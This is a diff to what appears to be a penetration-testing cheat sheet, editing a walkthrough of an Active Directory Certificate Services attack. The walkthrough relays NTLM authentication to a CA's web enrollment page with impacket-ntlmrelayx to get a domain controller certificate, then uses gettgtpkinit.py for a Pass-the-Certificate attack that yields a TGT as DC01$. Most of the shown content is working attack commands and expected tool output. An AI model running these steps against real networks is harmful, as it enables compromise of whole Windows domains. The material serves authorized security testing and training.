@@ -5720,7 +5720,7 @@ certipy find -u '<USER>@<corp.local>' -p '<PASSWORD>' -dc-ip '<IP>' -text -enabl
 **Run impacket-ntlmrelayx** 
 
 ```bash
-impacket-ntlmrelayx -t http://<IP>/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
+impacket-ntlmrelayx -t http://<CA01_IP>/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication --http-port 8080
 ```
 
 > **Note:** The value passed to --template may be different in other environments. This is simply the certificate template which is used by Domain Controllers for authentication.
@@ -5761,7 +5761,7 @@ Referring back to `ntlmrelayx`, we can see from the output that the authenticati
 # [*] Protocol Client DCSYNC loaded..
 # [*] Running in relay mode to single host
 # [*] Setting up SMB Server on port 445
-# [*] Setting up HTTP Server on port 80
+# [*] Setting up HTTP Server on port 8080
 # [*] Setting up WCF Server on port 9389
 # [*] Setting up RAW Server on port 6666
 # [*] Multirelay disabled
@@ -5782,12 +5782,6 @@ Referring back to `ntlmrelayx`, we can see from the output that the authenticati
 
 We can now perform a Pass-the-Certificate attack to obtain a TGT as DC01$. One way to do this is by using [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py).
 
-**Install oscrypto**
-
-```bash
-sudo apt update
-sudo apt install python3-oscrypto
-```
 
 **Clone the repository and install the dependencies**
 
@@ -5796,6 +5790,7 @@ git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
 python3 -m venv .venv
 source .venv/bin/activate
 pip3 install -r requirements.txt
+pip3 install -I git+https://github.com/wbond/oscrypto.git
 ```
 
 >Note: If you encounter error stating "Error detecting the version of libcrypto", it can be fixed by installing the [oscrypto](https://github.com/wbond/oscrypto) library.
@@ -5803,21 +5798,21 @@ pip3 install -r requirements.txt
 **Run PKINIT**
 
 ```bash
-python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip <DC01_IP> '<corp.local>/dc01$' /tmp/dc.ccache
+python3 gettgtpkinit.py -cert-pfx ../'DC01$.pfx' -dc-ip <DC01_IP> '<corp.local>/dc01$' /tmp/dc.ccache
 ```
 
 **Expected Output**
 
 ```bash
-# 2025-04-28 21:20:40,073 minikerberos INFO     Loading certificate and key from file
+# 2025-08-04 11:19:37,153 minikerberos INFO     Loading certificate and key from file
 # INFO:minikerberos:Loading certificate and key from file
-# 2025-04-28 21:20:40,351 minikerberos INFO     Requesting TGT
+# 2025-08-04 11:19:37,449 minikerberos INFO     Requesting TGT
 # INFO:minikerberos:Requesting TGT
-# 2025-04-28 21:21:05,508 minikerberos INFO     AS-REP encryption key (you might need this later):
+# 2025-08-04 11:19:48,595 minikerberos INFO     AS-REP encryption key (you might need this later):
 # INFO:minikerberos:AS-REP encryption key (you might need this later):
-# 2025-04-28 21:21:05,508 minikerberos INFO     3a1d192a28a4e70e02ae4f1d57bad4adbc7c0b3e7dceb59dab90b8a54f39d616
-# INFO:minikerberos:3a1d192a28a4e70e02ae4f1d57bad4adbc7c0b3e7dceb59dab90b8a54f39d616
-# 2025-04-28 21:21:05,512 minikerberos INFO     Saved TGT to file
+# 2025-08-04 11:19:48,595 minikerberos INFO     cf07977392429ff0769567d1b5eaf684422c00bc2976685b6a51c7db600211d5
+# INFO:minikerberos:cf07977392429ff0769567d1b5eaf684422c00bc2976685b6a51c7db600211d5
+# 2025-08-04 11:19:48,601 minikerberos INFO     Saved TGT to file
 # INFO:minikerberos:Saved TGT to file
 ```
 
